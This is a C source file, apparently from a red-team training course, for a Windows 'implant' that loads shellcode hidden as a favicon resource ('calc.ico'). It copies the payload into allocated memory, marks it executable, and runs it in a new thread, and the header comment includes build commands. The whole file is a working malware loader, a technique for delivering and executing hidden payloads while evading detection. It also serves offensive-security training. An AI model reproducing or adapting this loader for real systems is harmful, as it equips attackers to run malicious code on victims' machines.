/*

Based on RTO Course from Sektor 7 Institute.

https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc
https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory
https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect
https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread
https://docs.microsoft.com/en-us/windows/win32/api/synchapi/nf-synchapi-waitforsingleobject

https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-findresourcea
https://docs.microsoft.com/en-us/windows/win32/menurc/resource-types
https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadresource
https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-sizeofresource



@ECHO OFF

rc resources.rc
cvtres /MACHINE:x64 /OUT:resources.o resources.res
cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tcnewimplant.cpp /link /OUT:newimplant.exe /SUBSYSTEM:CONSOLE /MACHINE:x64 resources.o

resource.h
#define FAVICON_ICO 100

resources.rc
#include "resources.h"

FAVICON_ICO RCDATA calc.ico


*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "resources.h"


int wmain(void){

LPVOID exec_payload;
BOOL vp;
PDWORD lpflOldProtect = 0;
HANDLE new_thread;

HRSRC resource = FindResource(NULL, MAKEINTRESOURCE(FAVICON_ICO), RT_RCDATA);
if (resource != NULL){
	printf("\nResource Found\n");
} else {
	printf("\nResource Find FAILED\n");
}

HGLOBAL resourceHandle = LoadResource(NULL, resource);
if (resourceHandle != NULL){
	printf("\nResource Loaded\n");
} else {
	printf("\nResource Load FAILED\n");
}

LPVOID buf = (char *) LockResource(resourceHandle);

unsigned int buf_length = SizeofResource(NULL, resource);

printf("\nsize of payload is: %d\n", buf_length);


exec_payload = VirtualAlloc(0, buf_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

if (exec_payload != NULL) {
    printf("\ngood call to VirtualAlloc\n");
} else {
    printf("\nVirtual Alloc didnt work :/ \n");
    exit(-1);
};



RtlMoveMemory(exec_payload,buf,buf_length);
printf("\nMem Moved...\n");


vp = VirtualProtect(exec_payload, buf_length, PAGE_EXECUTE_READ, &lpflOldProtect);

if (vp == 0){
    printf("\nfailed to virtualprotect\n");
    exit(-1);
} else {
    printf("\nvirtual protect g2g\n");

printf("%-20s : 0x%-016p\n", "payload addr", (void *)buf);
printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_payload);

printf("\nDebug Breakpoint!\n");
getchar();    

    new_thread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_payload, 0,0,0);
    if (new_thread == NULL){
        printf("\nCreateThread failed :/ \n");
        exit(-1);
    } else {
    printf("\nCreateThread worked!\n");
    WaitForSingleObject(new_thread, -1);
}

};
};